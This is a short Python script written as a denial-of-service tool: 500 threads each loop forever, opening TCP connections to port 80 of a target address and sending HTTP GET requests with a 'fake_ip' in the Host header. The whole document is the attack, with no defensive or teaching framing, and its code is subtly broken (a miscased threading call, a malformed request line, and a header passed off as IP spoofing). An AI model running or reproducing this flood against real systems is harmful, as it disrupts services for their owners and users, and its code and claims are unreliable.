import threading
import socket

target = '10.0.0.1'
port = 80
fake_ip = '153.32.39.21'

def attack():
    while True:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((target,port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'),(target,port))
        s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target,port))
        s.close()
for i in range(500):
    thread = threading.thread(target = attack)
    thread.start()

